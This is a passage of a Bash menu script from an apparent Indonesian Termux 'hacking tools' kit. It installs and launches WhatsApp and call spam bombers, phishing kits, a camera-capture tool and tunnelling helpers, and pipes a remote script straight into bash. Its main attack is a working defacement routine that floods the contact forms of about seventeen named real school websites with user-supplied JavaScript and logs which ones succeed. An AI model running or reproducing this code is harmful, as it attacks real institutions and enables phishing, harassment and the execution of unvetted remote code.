$e $b"║$k [ botz ]$b  ║$h MENU BOTZ WHATSAPP                  $b ║"
$e $b"╚══════════════════════════════════════════════════╝$b"
$e $b"                ║              $b ║"
$e $b"╔══════════════════════════════════════════════════╗$b"
$e $b"║$k      $m          PEMBERITAHUAN        $b           $b  ║"
$e $b"╚══════════════════════════════════════════════════╝"
$e $b"║$k [ musik  ]$b ║$h MUSIK SETTING                     $b  ║"
$e $b"║$k [  info  ]$b ║$h LIST UPDATE TOOLSV5               $b  ║"
$e $b"║$k [  list  ]$b ║$h LIST USER PREMIUM                 $b  ║"
$e $b"║$k [ tutor  ]$b ║$h EDUKASI VIDEO                     $b  ║"
$e $b"║$k [  pesan ]$b ║$h PESAN UNTUK ANGGOTA TOOLSV5 PREM  $b  ║"
$e $b"║$k [ report ]$b ║$h LAPORKAN BUG                      $b  ║"
$e $b"║$k [    0   ]$b ║$h EXIT$b                               $b ║"
$e $b"╚══════════════════════════════════════════════════╝"
READ
if [ "$no" = "spam" ]; then
isipesan="Terdetek login ke Spam 👨‍💻"
kirimpesan &> /dev/null
TAMPILANTOOLSV5
SPAM
READ
if [ "$no" = "s1" ]; then
s1="$HOME/spam-wa"
if [ -d "$s1" ]; then
logfile="/data/data/com.termux/files/usr/share/list/S1" &> /dev/null
cd /data/data/com.termux/files/usr/share/list &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
$e $k "Salin Token Di Bawah Ini$h"
cat "$logfile"
echo
$e $m
read -p "Enter Untuk Melanjutkan"
cd $s1
python3 Run.py
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $k "Menginstall package !"
cd $HOME
git clone --depth 32 https://github.com/Sxp-ID/spam-wa
cd spam-wa
python -m pip install -r requirements.txt
fi
$e $k
ENTER
elif [ "$no" = "s2" ]; then
s2="$HOME/call-id"
if [ -d "$s2" ]; then
logfile="/data/data/com.termux/files/usr/share/list/S2" &> /dev/null
cd /data/data/com.termux/files/usr/share/list &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
$e $k "Salin Token Di Bawah Ini$h"
cat "$logfile"
echo
$e $m
read -p "Enter Untuk Melanjutkan"
cd $s2
python3 Run.py
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
cd $HOME
git clone --depth 32 https://github.com/Sxp-ID/call-id
cd call-id
fi
read -p "ENTER UNTUK MENGULANG TOOLSV5"
elif [ "$no" = "s3" ]; then
s3="$HOME/Premium-Call"
if [ -d "$s3" ]; then
logfile="/data/data/com.termux/files/usr/share/list/S3" &> /dev/null
cd /data/data/com.termux/files/usr/share/list &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
$e $k "Salin Token Di Bawah Ini$h"
cat "$logfile"
echo
$e $m
read -p "Enter Untuk Melanjutkan"
cd $s3
python3 Run.py
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $m "Installing Package...!"
cd $HOME
git clone --depth 32 https://github.com/Sxp-ID/Premium-Call
cd Premium-Call
fi
ENTER
elif [ "$no" = "s4" ]; then
if [ -f "$idtermux" ]; then
valid_ids="$idtermux"
termux_id=$(whoami)
if [[ $(grep -c "$termux_id" $valid_ids) -eq 1 ]]; then
clear
$e $k "Penguna$h VIP UNLOCK"
sleep 5
clear
S4="$HOME/Brutal-W4"
if [ -d "$S4" ]; then
logfile="/data/data/com.termux/files/usr/share/list/S4" &> /dev/null
cd /data/data/com.termux/files/usr/share/list &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
$e $k "Salin Token Di Bawah Ini$h"
cat "$logfile"
echo
$e $m
read -p "Enter Untuk Melanjutkan"
cd $S4
make run
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
cd $HOME
clear
git clone --depth 32 https://github.com/Sxp-ID/Brutal-W4
cd Brutal-W4
make install
fi
else
clear
$e $m "Anda Bukan Penguna VIP"
sleep 5
clear
fi
fi
ENTER
elif [ "$no" = "s5" ]; then
cd $galirusfile
chmod 777 404.py
$e $k "MEMBUKA SPAM"
sleep 3
clear
python3 404.py
sleep 3
ENTER
elif [ "$no" = "s6" ]; then
sleep 2
clear
S6="$HOME/Call-Simpel"
if [ -d "$S6" ]; then
$e $k "Membuka SPAM$h"
logfile="/data/data/com.termux/files/usr/share/list/s6" &> /dev/null
cd /data/data/com.termux/files/usr/share/list &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
$e $k "Salin Token Di Bawah Ini$h"
cat "$logfile"
echo
$e $m
read -p "Enter Untuk Melanjutkan"
clear
cd $S6
make Run
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
cd $HOME
apt-get install git
git clone --depth 32 https://github.com/Bayu12345677/Call-Simpel
cd Call-Simpel
apt-get install make
make set
fi
ENTER
elif [ "$no" = "s7" ]; then
s7="$HOME/litespam"
if [ -d "$s7" ]; then
clear
logfile="/data/data/com.termux/files/usr/share/list/s7" &> /dev/null
cd /data/data/com.termux/files/usr/share/list &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
$e $k "Salin Token Di Bawah Ini$h"
cat "$logfile"
echo
$e $m
read -p "Enter Untuk Melanjutkan"
clear
cd $s7
./main
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
cd $HOME
nala install bash git curl wget jq make clang -y
git clone --depth 32 https://github.com/Sxp-ID/litespam
cd litespam
make install
fi
read -p "ENTER UNTUK MENGULANG TOOLSV5"
elif [ "$no" = "s8" ]; then
if [ -f "$idtermux" ]; then
valid_ids="$idtermux"
termux_id=$(whoami)
if [[ $(grep -c "$termux_id" $valid_ids) -eq 1 ]]; then
clear
$e $k "Penguna$h VIP UNLOCK"
sleep 5
clear
S8="$HOME/Ketupat-Terror"
if [ -d "$S8" ]; then
logfile="/data/data/com.termux/files/usr/share/list/S8" &> /dev/null
cd /data/data/com.termux/files/usr/share/list &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
$e $k "Salin Token Di Bawah Ini$h"
cat "$logfile"
echo
$e $m
read -p "Enter Untuk Melanjutkan"
cd $S8
make Run
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
cd $HOME
$e $k "Installasi Script ....!$h"
pkg update
pkg upgrade
nala install curl git ruby
nala install make clang
nala install screen
nala install python
nala install python-pip mpv
pip install rich
pip install rich-cli
gem install lolcat
git clone --depth 32 https://github.com/Bayu12345677/Ketupat-Terror.git
cd Ketupat-Terror
make setup
fi
ENTER
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $m "Anda Bukan Penguna VIP"
sleep 5
clear
fi
fi
elif [ "$no" = "s9" ]; then
prem="/$HOME/Premium-Call"
if [ -d "$prem" ]; then
clear
echo "       Anda Sudak Menginstallnya "
git pull
cd /$HOME/Premium-Call
ulang="y"
while [ $ulang == "y" ]; do
python3 run.py
read -p "Ulang I Login Spam ? ( y/n ) : " ulang
clear
echo "Sabar Yak ! Lagi Loading ...!"
done
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
echo "        Anda Belum Menginstallnya"
sleep 2
echo "        Menginstall package"
echo
cd $HOME
nala install python3 && nala install python3-pip
nala install git
git clone --depth 32 https://github.com/Dra-ID/Premium-Call
git clone --depth 3 https://github.com/Dra-ID/Premium-Call
git clone --depth 2 https://github.com/Dra-ID/Premium-Call
cd Premium-Call
ls
pip install -r requirements.txt
git pull
python3 run.py
fi
ENTER
elif [ "$no" = "s10" ]; then
if [ -f "$idtermux" ]; then
valid_ids="$idtermux"
termux_id=$(whoami)
if [[ $(grep -c "$termux_id" $valid_ids) -eq 1 ]]; then
clear
$e $k "Penguna$h VIP UNLOCK"
sleep 5
clear
logfile="/data/data/com.termux/files/usr/share/list/S10" &> /dev/null
cd /data/data/com.termux/files/usr/share/list &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
$e $k "Salin Token Di Bawah Ini$h"
cat "$logfile"
echo
$e $m
read -p "Enter Untuk Melanjutkan"
bayu="$HOME/OTP_TeRoRV2"
if [ -d "$bayu" ]; then
cd $bayu
make setup
python3 app.sh.py
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
cd $HOME
echo "Udah Dapet Izin Sama Pemiliknya"
sleep 3
echo "Installing package dulu !"
pkg update
pkg upgrade
nala install curl git ruby
nala install make clang
nala install screen
nala install python
nala install python-pip mpv
pip install rich
pip install rich-cli
gem install lolcat
git clone --depth 32 https://github.com/Bayu12345677/OTP_TeRoRV2.git
cd OTP_TeRoRV2
ENTER
fi
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $m "Anda Bukan Penguna VIP"
sleep 5
clear
fi
fi
elif [ "$no" = "s11" ]; then
while true; do
spambot="/data/data/com.termux/spambot"
if [ -d "$spambot" ]; then
cd $spambot
git pull origin main
git stash
bash gas.sh
break
else
cd /data/data/com.termux/
git clone --depth 32 https://github.com/zerotermux/spambot
cd spambot
git pull origin main
git stash
fi
done
fi
fi
if [ "$no" = "hack" ]; then
isipesan="Terdeteksi login Hack / Phising ! 👨‍��"
kirimpesan &> /dev/null
TAMPILANTOOLSV5
PHISING
READ
if [ "$no" = "11" ]; then
while true; do
seeker="$HOME/seeker"
if [ -d "$seeker" ]; then
sleep 1
logfile="/data/data/com.termux/files/usr/share/list/tutorseeker" &> /dev/null
cd /data/data/com.termux/files/usr/share/list &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
clear
$e $k "MEMBUKA Seeker$h "
sleep 5
cd $seeker
clear
python3 seeker.py
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $h
sleep 2
nala install libicu
pkg reinstall php
nala install php
pip3 install packaging psutil
cd $HOME
git clone --depth 32 https://github.com/thewhiteh4t/seeker
cd seeker
git pull origin main
clear
$e $k
fi
done
elif [ "$no" = "12" ]; then
while true; do
nexphisher="/data/data/com.termux/files/usr/opt/zphisher"
if [ -d "$nexphisher" ]; then
$e $k "Membuka TOOLS"
sleep 5
zphisher
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $k "Menginstall package$h "
nala install tur-repo
nala install zphisher
fi
done
$e $k
elif [ "$no" = "13" ]; then
xdg-open "https://character.ai/chat/k80q5UvBeKFcyCv0dApXiakhpQUH_Cg0mcTFsxydw0E"
ENTER
elif [ "$no" = "14" ]; then
while true; do
if [ -f "$idtermux" ]; then
valid_ids="$idtermux"
termux_id=$(whoami)
if [[ $(grep -c "$termux_id" $valid_ids) -eq 1 ]]; then
clear
$e $k "Penguna$h VIP UNLOCK"
sleep 5
clear
ngrok="$HOME/ngrok"
if [ -d "$ngrok" ]; then
cd $ngrok
clear
cowsay -f eyes "Hello Boy ! Anda Berada Di Ngrok" | lolcat
echo
$e $k "Mau Menggunakan Metode Apa ? http / tcp ? "
read -p "G404☠️localhost ( http - tcp ) : " manakocak
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
clear
cowsay -f eyes "Hello Boy ! Anda Berada Di Ngrok" | lolcat
echo
$e $k "Mau Pake Port Apa ?$m contoh:$h 8080"
read -p "G404☠️localhost : " port
clear
$e $h "NYALAKAN DULU$m HOTSPOT$h ANDA"
read -p "ENTER UNTUK MEMULAI"
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
./ngrok $manakocak $port
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $k "INSTALL NGROK"
sleep 2
cd $HOME
git clone --depth 1 https://github.com/zerotermux/ngrok
cd ngrok
tar -xzvf ngrok-v3-stable-linux-arm64.tgz
read -p "Masukkan AuthToken Ngrok Anda : " tokenlu
./ngrok config add-authtoken $tokenlu
clear
$e $h "NGROK SUDAH TERINSTAL DI LENGKAP I DENGAN TOKEN"
sleep 5
fi
ENTER
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $m "Anda Bukan Penguna VIP"
sleep 5
clear
fi
fi
done
elif [ "$no" = "15" ]; then
bluearchive() {
audioupdate() {
cd /data/data/com.termux/files/usr/include/
git clone --depth 1 https://github.com/zerotermux/audio
cd /data/data/com.termux/files/usr/include/audio
git pull origin main
git stash
}
audioupdate &> /dev/null &
audio_dir="/data/data/com.termux/files/usr/include/audio"
audio_files=($(ls -1 $audio_dir/*.mp3 | shuf))
for ((i = 1; i <= 2; i++)); do
random_audio=${audio_files[$RANDOM % ${#audio_files[@]}]}
play -q "$random_audio" &> /dev/null
done
}
baner() {
echo "
██████╗ ███████╗███████╗ █████╗  ██████╗███████╗
██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝
██║  ██║█████╗  █████╗  ███████║██║     █████╗
██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝
██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗
╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝ G404"
}
DEFACE() {
local nama="$1"
local email="$2"
local pesan="$3"
send_data() {
local form_url=$1
local submit_url=$2
local admin_url=$3
local user_agents=(
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9"
"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4"
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
)
local user_agent="${user_agents[$RANDOM % ${#user_agents[@]}]}"
local response=$(curl -s -c cookies.txt -A "$user_agent" "$form_url")
local token=$(echo "$response" | grep -oP '(?<=name="token" value=")[^"]*')
local http_status
if [[ -n "$token" ]]; then
response=$(curl -s -b cookies.txt -X POST "$submit_url" \
-d "nama=$nama" \
-d "email=$email" \
-d "pesan=$pesan" \
-d "token=$token" \
-D headers.txt \
-A "$user_agent")
else
response=$(curl -s -b cookies.txt -X POST "$submit_url" \
-d "nama=$nama" \
-d "email=$email" \
-d "pesan=$pesan" \
-D headers.txt \
-A "$user_agent")
fi
http_status=$(grep "HTTP/" headers.txt | awk '{print $2}')
if [[ "$http_status" == "200" ]]; then
$e $bg_u "Status$h 200$bl:$b Galirus Berhasil Menyerang$res"
$e $bg_pu "Hasilnya Cuy URL$res"
$e $bg_p "$m$admin_url$res"
echo "$admin_url" >> /storage/emulated/0/HASIL-DEFACEG404.txt
echo
else
$e $bg_u "Status$m $http_status$bl:$b Waduh Galirus Gagal Menyerang$bl"
$e $bg_p "$m$admin_url$res"
echo
fi
}
declare -a urls=(
"https://www.ppdb.smkn2kayuagung.sch.id/index.php?page=contact"
"https://www.ppdb.smkn2kayuagung.sch.id/index.php?page=kirimpesan"
"https://www.ppdb.smkn2kayuagung.sch.id/admin/hubungi.php"
"https://kelulusan.smkbinapatria1sukoharjo.sch.id/index.php?page=contact"
"https://kelulusan.smkbinapatria1sukoharjo.sch.id/index.php?page=kirimpesan"
"https://kelulusan.smkbinapatria1sukoharjo.sch.id/admin/hubungi.php"
"https://smkn4purworejo.sch.id/lulussmk4/index.php?page=contact"
"https://smkn4purworejo.sch.id/lulussmk4/index.php?page=kirimpesan"
"https://smkn4purworejo.sch.id/lulussmk4/admin/hubungi.php"
"https://asiksmk.smkyp17jombang.sch.id/index.php?page=contact"
"https://asiksmk.smkyp17jombang.sch.id/index.php?page=kirimpesan"
"https://asiksmk.smkyp17jombang.sch.id/admin/hubungi.php"
"https://kelulusansman7plg.sman7palembang.sch.id/index.php?page=contact"
"https://kelulusansman7plg.sman7palembang.sch.id/index.php?page=kirimpesan"
"https://kelulusansman7plg.sman7palembang.sch.id/admin/hubungi.php"
"https://www.smkntanjungsari.sch.id/kelulusan/pengumuman/index.php?page=contact"
"https://www.smkntanjungsari.sch.id/kelulusan/pengumuman/index.php?page=kirimpesan"
"https://www.smkntanjungsari.sch.id/admin/hubungi.php"
"https://sman2kalianda.sch.id/kelulusan/index.php?page=contact"
"https://sman2kalianda.sch.id/kelulusan/index.php?page=kirimpesan"
"https://sman2kalianda.sch.id/kelulusan/admin/hubungi.php"
"https://kelulusan.smk234adw.sch.id/index.php?page=contact"
"https://kelulusan.smk234adw.sch.id/index.php?page=kirimpesan"
"https://kelulusan.smk234adw.sch.id/admin/hubungi.php"
"https://sman1plemahan.sch.id/pengumuman/index.php?page=contact"
"https://sman1plemahan.sch.id/pengumuman/index.php?page=kirimpesan"
"https://sman1plemahan.sch.id/pengumuman/admin/hubungi.php"
"https://smpn211jakarta.sch.id/infokelulusan2024/index.php?page=contact"
"https://smpn211jakarta.sch.id/infokelulusan2024/index.php?page=kirimpesan"
"https://smpn211jakarta.sch.id/infokelulusan2024/admin/hubungi.php"
"https://www.skl.smpn1bojonegoro.sch.id/index.php?page=contact"
"https://www.skl.smpn1bojonegoro.sch.id/index.php?page=kirimpesan"
"https://www.skl.smpn1bojonegoro.sch.id/admin/hubungi.php"
"https://malidaprofetik.sch.id/kelulusan/index.php?page=contact"
"https://malidaprofetik.sch.id/kelulusan/index.php?page=kirimpesan"
"https://malidaprofetik.sch.id/kelulusan/admin/hubungi.php"
"https://lulus.smansakakap.sch.id/index.php?page=contact"
"https://lulus.smansakakap.sch.id/index.php?page=kirimpesan"
"https://lulus.smansakakap.sch.id/admin/hubungi.php"
"http://www.kelulusan.sman1subang.sch.id/index.php?page=contact"
"http://www.kelulusan.sman1subang.sch.id/index.php?page=kirimpesan"
"http://www.kelulusan.sman1subang.sch.id/admin/hubungi.php"
"https://info.labschoolcibubur.sch.id/osissmp/index.php?page=contact"
"https://info.labschoolcibubur.sch.id/osissmp/index.php?page=kirimpesan"
"https://info.labschoolcibubur.sch.id/osissmp/admin/hubungi.php"
"http://www.lulusan.sman4-pkp.sch.id/index.php?page=contact"
"http://www.lulusan.sman4-pkp.sch.id/index.php?page=kirimpesan"
"http://www.lulusan.sman4-pkp.sch.id/admin/hubungi.php"
"https://www.un2020.smkn3baubau.sch.id/index.php?page=contact"
"https://www.un2020.smkn3baubau.sch.id/index.php?page=kirimpesan"
"https://www.un2020.smkn3baubau.sch.id/admin/hubungi.php"
)
for ((i = 0; i < ${#urls[@]}; i += 3)); do
form_url="${urls[i]}"
submit_url="${urls[i + 1]}"
admin_url="${urls[i + 2]}"
send_data "$form_url" "$submit_url" "$admin_url"
done
}
Premfree() {
clear
baner | lolcat
bluearchive &> /dev/null
xdg-open "https://tools.zone-xsec.com/defacer/jso"
read -p "Masukkan Pesan (Jso): " javascript
read -p "Durasi (dalam detik, misalnya 10): " duration
clear
echo -e $h "🔥Memulai Serangan Spam Upload🔥"
sleep 3
$e $bg_m "Berhenti Otomatis Tergantung Pada Duration$res"
if ! [[ "$duration" =~ ^[0-9]+$ ]]; then
echo -e "$m"Durasi harus berupa angka!$res
exit 1
fi
start_time=$(date +%s)
end_time=$((start_time + duration))
while [ $(date +%s) -lt $end_time ]; do
current_time=$(date +%s)
DEFACE "GALIRUS OFFICIAL" "Stay-Carakter-bung@gmail.com" "$javascript"
sleep 1
done
echo "Durasi selesai. Menghentikan proses."
}
if [ -d "/data/data/com.termux/files/usr/share/nlolcat/" ]; then
complate="$HOME/succesboskuh🗿"
if [ -f "$complate" ]; then
clear
Premfree
else
clear
echo "Installasi Package Sabar !"
apt update
nala install curl wget ruby sox mpv ncurses-utils -y
gem install lolcat
cd /data/data/com.termux/files/usr/share/ &> /dev/null
git clone --depth 1 https://github.com/zerotermux/sound
# git clone --depth 1 https://github.com/zerotermux/pockat &> /dev/null
cd /data/data/com.termux/files/usr/include/
git clone --depth 1 https://github.com/zerotermux/git3 &> /dev/null
git clone --depth 1 https://github.com/zerotermux/audio
cd /data/data/com.termux/files/usr/share/
git clone --depth 1 https://github.com/zerotermux/nlolcat &> /dev/null
touch "$complate"
clear
read -p "Kalau Boleh Tau Siapa Nama Anda ? " namamu
echo "$namamu" > "$siapa"
clear
echo "Bantu Subscribe Galirus Official ��"
sleep 5
xdg-open "https://www.youtube.com/@GalirusProjects"
clear
echo "TUTORIALNYA DI TIKTOK SINI BREK !"
sleep 10
xdg-open "https://vt.tiktok.com/ZSY3Jkq5K/"
fi
else
clear
echo -e "$bg_m DIREKTORI PENTING HILANG,PROSES PERBAIKAN$res"
sleep 5
cd /data/data/com.termux/files/usr/share/ &> /dev/null
git clone --depth 32 https://github.com/zerotermux/nlolcat &> /dev/null
git pull origin main
git stash
fi
ENTER
elif [ "$no" = "16" ]; then
while true; do
if [ -f "$idtermux" ]; then
valid_ids="$idtermux"
termux_id=$(whoami)
if [[ $(grep -c "$termux_id" $valid_ids) -eq 1 ]]; then
clear
$e $k "Penguna$h VIP UNLOCK"
sleep 5
clear
clear
adb="$HOME/adbwebkit"
if [ -d "$adb" ]; then
cd $adb
php -S 127.0.0.1:8000 &> /dev/null &
xdg-open "http://127.0.0.1:8000"
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
cd $HOME
git clone --depth 32 https://github.com/jxroot/adbwebkit.git
cd adbwebkit
fi
ENTER
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $m "Anda Bukan Penguna VIP"
sleep 5
clear
fi
fi
done
elif [ "$no" = "17" ]; then
while true; do
userfinder="/sdcard/UserFinder"
if [ -d "$userfinder" ]; then
cd $userfinder
git pull
$e $k "MEMBUKA SCRIPT"
sleep 3
clear
bash UserFinder.sh
$e $k
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
sleep 2
$e $k "Menginstall PENJELAJAH NAME"
cd /sdcard
git clone --depth 32 https://github.com/mishakorzik/UserFinder
cd UserFinder
fi
done
ENTER
elif [ "$no" = "18" ]; then
while true; do
neth="$HOME/NETHUNTER"
if [ -d "$neth" ]; then
cd $neth
git pull
bash install.sh
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
sleep 2
$e $k "INSTALL NETHUNTER"
cd $HOME
git clone --depth 32 https://github.com/Galirus404/NETHUNTER
cd NETHUNTER
fi
done
ENTER
elif [ "$no" = "19" ]; then
while true; do
camhack="/sdcard/CAM-DUMPER"
if [ -d "$camhack" ]; then
$e $k "MEMBUKA CAM HACK"
sleep 2
clear
cd $camhack
bash camdumper.sh
$e $k
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $k " Menginstall Cam Hack"
sleep 2
nala install git php wget curl jq openssh
cd /sdcard
git clone --depth 32 https://github.com/LiNuX-Mallu/CAM-DUMPER.git
cd CAM-DUMPER
git pull
chmod +x camdumper.sh
fi
done
ENTER
elif [ "$no" = "20" ]; then
while true; do
backup="/sdcard/BACKUP"
if [ -d "$backup" ]; then
cd $backup
clear
$e $k "MEMBUKA BACKUP"
sleep 2
clear
bash backup.sh
$e $k
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $k "MENGINSTALL PACKAGE"
sleep 2
cd /sdcard
git clone --depth 32 https://github.com/Galirus404/BACKUP
cd BACKUP
git pull
fi
done
ENTER
elif [ "$no" = "21" ]; then
echo "Installing required packages..."
pkg update && pkg upgrade -y
nala install openssh -y
nala install figlet -y
nala install ruby -y
gem install lolcat
clear
echo "Membuka SSH SERVEO.NET"
clear
figlet "SSH" | lolcat
echo
echo "SSH ini bisa buat combo dari seeker, cam hack, dan pengujian DDOS"
echo
read -p "Masukkan Port  ===> " isi
clear
echo "Port Yang Anda Masukkan: $isi"
echo
echo "Link di bawah silakan copy dan gunakan:"
ssh -R 80:localhost:$isi serveo.net
echo
ENTER
elif [ "$no" = "22" ]; then
clear
$e $k "MEMBUKA BROWSING CHECK HOSTING"
sleep 3
xdg-open "https://check-host.net/"
elif [ "$no" = "23" ]; then
clear
while true; do
HT="$HOME/AllHackingTools"
if [ -f "$HT" ]; then
$e $h "Package Sudah Ada Menjalankan !"
sleep 3
cd $HT
bash install.sh
break
else
sleep 2
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $m "Installasi package$res"
sleep 3
apt update
apt upgrade
termux-setup-storage
nala install git
cd $HOME
git clone --depth 32 https://github.com/mishakorzik/AllHackingTools
cd AllHackingTools
bash Install.sh
fi
done
ENTER
elif [ "$no" = "24" ]; then
while true; do
clear
view="/data/data/com.termux/files/usr/lib/run"
if [ -d "$view" ]; then
cd $view
play -q $HOME/TOOLSV5/sound/robot2.mp3 &> /dev/null &
$e $bg_m "Sebelumnya Saya Berterimakasih Banyak Untuk Teman Saya$res"
sleep 5
clear
play -q $HOME/TOOLSV5/sound/robot2.mp3 &> /dev/null &
$e $bg_m "Yang sudah membantu saya mengizinkan perkembangan TOOLSV5$res"
sleep 5
clear
play -q $HOME/TOOLSV5/sound/robot2.mp3 &> /dev/null &
$e $bg_m "THANKS FOR GUSTI$res"
sleep 5
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
python3 run.py
break
else
cd /data/data/com.termux/files/usr/lib/
git clone --depth 32 https://github.com/zerotermux/run &> /dev/null | $e $bg_m "Bentar Brek ini proses download script\n Selesai Otomatis Tulisan Ini Hilang$res"
cd run &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
fi
done
elif [ "$no" = "25" ]; then
$e $k "Membuka browsing"
sleep 3
xdg-open "https://grabify.link/"
elif [ "$no" = "26" ]; then
$e $k "Pengembangan Harap Bersabar"
ENTER
elif [ "$no" = "27" ]; then
Downloadnowatermark
elif [ "$no" = "28" ]; then
$e $k "Siapkan Dulu/Salin Link Yang mau di Download"
sleep 5
read -p "ENTER untuk Melanjutkan" ld
clear
$e $k "Membuka Link "
sleep 3
xdg-open "https://id.savefrom.net/1-cara-mengunduh-video-youtube-160oX.html"
elif [ "$no" = "29" ]; then
$e $k "Siapkan dulu/salin Link yang mau di Download"
sleep 5
read -p "ENTER untuk Melanjutkan" id
clear
$e $k "Membuka Link"
sleep 3
xdg-open "https://ytmp3.nu/9A1f/"
elif [ "$no" = "30" ]; then
while true; do
adb="$HOME/ADB"
if [ -d "$adb" ]; then
cd $adb
git pull origin main
clear
$e $k "Membuka ADB DEBUGGING"
bash adb.sh
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
apt update
nala install git
nala install python3
cd $HOME
git clone --depth 32 https://github.com/Galirus404/ADB
cd ADB
fi
done
ENTER
elif [ "$no" = "31" ]; then
$e $k "Installasi package"
sleep 2
nala install -y curl
bash -c "$(curl -L gitee.com/mo2/linux/raw/2/2)"
ENTER
elif [ "$no" = "32" ]; then
url2="xdg-open "
clear
echo "NJIR nyari DOSA :v "
sleep 2
clear
$e $k " ADMIN TIDAK TANGGUNG JAWAB\n ATAS RESIKO PENYESALAN KALIAN"
$e $bl
read -p " Masukkan Pilihan (1-9): " jir
if [ $jir = "1" ]; then
$e "Anda memilih 1"
xdg-open "https://www.mediafire.com/file/tdc8wsqqm07u1ph/2028.7z/file?dkey=3liqmf5ttdk&r=438"
elif [ $jir = "2" ]; then
$e "Anda memilih 2"
xdg-open "https://www.mediafire.com/file/cjzn898bnq4rga5/2004.7z/file?dkey=lb41i1qn07g&r=1912"
elif [ $jir = "3" ]; then
$e "Anda memilih 3"
xdg-open "https://www.mediafire.com/file/vec7se3y03gy78y/2070.7z/file"
elif [ $jir = "4" ]; then
$e "Anda memilih 4"
xdg-open "https://www.mediafire.com/file/b9eln67qgnqymnf/1322.7z/file?dkey=wdnoaydojkv&r=1271"
elif [ $jir = "5" ]; then
$e "Anda memilih 5"
xdg-open "https://www.mediafire.com/file/oanpipgai1jmst4/2225.7z/file?dkey=4809hl76mbs&r=604"
elif [ $jir = "6" ]; then
$e "Anda memilih 6"
xdg-open "https://vm.tiktok.com/ZSNpa6XfL/"
elif [ $jir = "7" ]; then
$e "Anda memilih 7"
xdg-open "https://www.mediafire.com/file/k67ms85xt2dfs2m/3900.7z/file"
elif [ $jir = "8" ]; then
$e "Anda memilih 8"
xdg-open "https://www.mediafire.com/file/a3ret0xyijvf60l/4013.7z/file?dkey=6hi05g0ophf&r=74"
elif [ $jir = "9" ]; then
$e "Anda memilih 9"
xdg-open "https://www.mediafire.com/file/4gzvhxxygdf9p7k/3911.7z/file?dkey=6840u0dkpeu&r=504"
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e "Pilihan Tidak Valid"
fi
ENTER
elif [ "$no" = "33" ]; then
while true; do
tempmail="$HOME/Temp-Mail"
if [ -d "$tempmail" ]; then
$e $h "Anda Sudak Menginstall...❗"
sleep 3
clear
cd $tempmail
read -p " Username ( Terserah ) : " ala
node temp.js $ala
break
else
